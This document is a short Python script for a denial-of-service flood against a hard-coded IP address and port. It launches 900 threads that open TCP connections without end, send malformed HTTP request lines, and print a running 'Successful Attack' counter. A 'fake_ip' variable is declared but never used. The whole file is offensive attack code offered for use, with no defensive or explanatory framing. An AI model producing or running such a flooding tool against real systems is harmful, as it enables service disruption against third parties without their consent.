import socket
import threading

target = "203.175.8.164"
fake_ip = "203.175.8.165"
port = 12160
attack_num = 0

def attack():
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect((target, port))
        
        soc.sendto(("GET /"+target + "HTTPS/1.1\r\n").encode("ascii"),
        (target, port))
        
        soc.sendto(("Host: "+target+"\r\n").encode("ascii"),
        (target, port))
        
        global attack_num
        attack_num += 1
        print(f"[+] Attack {attack_num} Successful Attack")
        
        soc.close()
for i in range(900):
    thread = threading.Thread(target=attack)
    thread.start()